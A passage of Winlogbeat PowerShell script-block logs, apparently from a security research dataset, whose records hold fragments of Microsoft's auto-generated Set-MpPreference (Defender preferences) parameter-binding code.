'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.UpdatesChannelType'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('EngineUpdatesChannel')) {\n          [object]$__cmdletization_value = ${EngineUpdatesChannel}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EngineUpdatesChannel'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.UpdatesChannelType'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EngineUpdatesChannel'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.UpdatesChannelType'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('DefinitionUpdatesChannel')) {\n          [object]$__cmdletization_value = ${DefinitionUpdatesChannel}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DefinitionUpdatesChannel'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.UpdatesChannelType'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DefinitionUpdatesChannel'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.UpdatesChannelType'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('DisableGradualRelease')) {\n          [object]$__cmdletization_value = ${DisableGradualRelease}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableGradualRelease'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableGradualRelease'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('AllowNetworkProtectionDownLevel')) {\n          [object]$__cmdletization_value = ${AllowNetworkProtectionDownLevel}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AllowNetworkProtectionDownLevel'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AllowNetworkProtectionDownLevel'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('AllowDatagramProcessingOnWinServer')) {\n          [object]$__cmdletization_value = ${AllowDatagramProcessingOnWinServer}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AllowDatagramProcessingOnWinServer'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AllowDatagramProcessingOnWinServer'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('EnableDnsSinkhole')) {\n          [object]$__cmdletization_value = ${EnableDnsSinkhole}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EnableDnsSinkhole'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EnableDnsSinkhole'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('DisableInboundConnectionFiltering')) {\n          [object]$__cmdletization_value = ${DisableInboundConnectionFiltering}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableInboundConnectionFiltering'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableInboundConnectionFiltering'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('DisableRdpParsing')) {\n          [object]$__cmdletization_value = ${DisableRdpParsing}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableRdpParsing'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableRdpParsing'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('DisableNetworkProtectionPerfTelemetry')) {\n          [object]$__cmdletization_value = ${DisableNetworkProtectionPerfTelemetry}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableNetworkProtectionPerfTelemetry'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableNetworkProtectionPerfTelemetry'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('TrustLabelProtectionStatus')) {\n          [object]$__cmdletization_value = ${TrustLabelProtectionStatus}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TrustLabelProtectionStatus'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TrustLabelProtectionStatus'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n      $__cmdletization_returnValue = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = $false }\n      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('Set', $__cmdletization_methodParameters, $__cmdletization_returnValue)\n      $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_methodInvocationInfo)\n\n            }\n        }\n        catch\n        {\n            $__cmdletization_exceptionHasBeenThrown = $true\n            throw\n        }\n    }\n        \n\n    End {\n        try\n        {\n            if (-not $__cmdletization_exceptionHasBeenThrown)\n            {\n                $__cmdletization_objectModelWrapper.EndProcessing()\n            }\n        }\n        catch\n        {\n            throw\n        }\n    }\n\n    # .EXTERNALHELP MSFT_MpPreference.cdxml-Help.xml\n}\nMicrosoft.PowerShell.Core\\Export-ModuleMember "}
{"timestamp":"2021-09-15T16:35:23","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:35:23","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Execute a Remote Command","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":"rShell.Cmdletization.MethodParameter]@{Name = 'ScanScheduleQuickScanTime'; ParameterType = 'System.DateTime'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanScheduleQuickScanTime'; ParameterType = 'System.DateTime'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('ScanScheduleTime')) {\n          [object]$__cmdletization_value = ${ScanScheduleTime}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanScheduleTime'; ParameterType = 'System.DateTime'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ScanScheduleTime'; ParameterType = 'System.DateTime'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('ThrottleForScheduledScanOnly')) {\n          [object]$__cmdletization_value = ${ThrottleForScheduledScanOnly}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ThrottleForScheduledScanOnly'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ThrottleForScheduledScanOnly'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('SignatureFirstAuGracePeriod')) {\n          [object]$__cmdletization_value = ${SignatureFirstAuGracePeriod}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureFirstAuGracePeriod'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureFirstAuGracePeriod'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('SignatureAuGracePeriod')) {\n          [object]$__cmdletization_value = ${SignatureAuGracePeriod}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureAuGracePeriod'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureAuGracePeriod'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('SignatureDefinitionUpdateFileSharesSources')) {\n          [object]$__cmdletization_value = ${SignatureDefinitionUpdateFileSharesSources}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureDefinitionUpdateFileSharesSources'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureDefinitionUpdateFileSharesSources'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('SignatureDisableUpdateOnStartupWithoutEngine')) {\n          [object]$__cmdletization_value = ${SignatureDisableUpdateOnStartupWithoutEngine}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureDisableUpdateOnStartupWithoutEngine'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureDisableUpdateOnStartupWithoutEngine'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('SignatureFallbackOrder')) {\n          [object]$__cmdletization_value = ${SignatureFallbackOrder}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureFallbackOrder'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureFallbackOrder'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('SharedSignaturesPath')) {\n          [object]$__cmdletization_value = ${SharedSignaturesPath}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SharedSignaturesPath'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SharedSignaturesPath'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('SignatureScheduleDay')) {\n          [object]$__cmdletization_value = ${SignatureScheduleDay}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureScheduleDay'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.Day'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureScheduleDay'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.Day'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('SignatureScheduleTime')) {\n          [object]$__cmdletization_value = ${SignatureScheduleTime}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureScheduleTime'; ParameterType = 'System.DateTime'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureScheduleTime'; ParameterType = 'System.DateTime'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('SignatureUpdateCatchupInterval')) {\n          [object]$__cmdletization_value = ${SignatureUpdateCatchupInterval}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureUpdateCatchupInterval'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureUpdateCatchupInterval'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('SignatureUpdateInterval')) {\n          [object]$__cmdletization_value = ${SignatureUpdateInterval}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureUpdateInterval'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureUpdateInterval'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('SignatureBlobUpdateInterval')) {\n          [object]$__cmdletization_value = ${SignatureBlobUpdateInterval}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureBlobUpdateInterval'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureBlobUpdateInterval'; ParameterType = 'System.UInt32'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('Si"}
{"timestamp":"2021-09-15T16:35:23","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:35:23","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Execute a Remote Command","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":"arameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ThreatAction'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('LowThreatDefaultAction')) {\n          [object]$__cmdletization_value = ${LowThreatDefaultAction}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'LowThreatDefaultAction'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ThreatAction'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'LowThreatDefaultAction'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ThreatAction'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('ModerateThreatDefaultAction')) {\n          [object]$__cmdletization_value = ${ModerateThreatDefaultAction}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ModerateThreatDefaultAction'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ThreatAction'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ModerateThreatDefaultAction'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ThreatAction'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('HighThreatDefaultAction')) {\n          [object]$__cmdletization_value = ${HighThreatDefaultAction}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'HighThreatDefaultAction'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ThreatAction'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'HighThreatDefaultAction'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ThreatAction'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('SevereThreatDefaultAction')) {\n          [object]$__cmdletization_value = ${SevereThreatDefaultAction}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SevereThreatDefaultAction'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ThreatAction'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SevereThreatDefaultAction'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ThreatAction'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('Force')) {\n          [object]$__cmdletization_value = ${Force}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:operationOption:Force'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:operationOption:Force'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('DisableBlockAtFirstSeen')) {\n          [object]$__cmdletization_value = ${DisableBlockAtFirstSeen}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableBlockAtFirstSeen'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableBlockAtFirstSeen'; ParameterType = 'System.Boolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('PUAProtection')) {\n          [object]$__cmdletization_value = ${PUAProtection}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'PUAProtection'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.PUAProtectionType'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'PUAProtection'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.PUAProtectionType'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('CloudBlockLevel')) {\n          [object]$__cmdletization_value = ${CloudBlockLevel}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'CloudBlockLevel'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.CloudBlockLevelType'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'CloudBlockLevel'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.CloudBlockLevelType'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        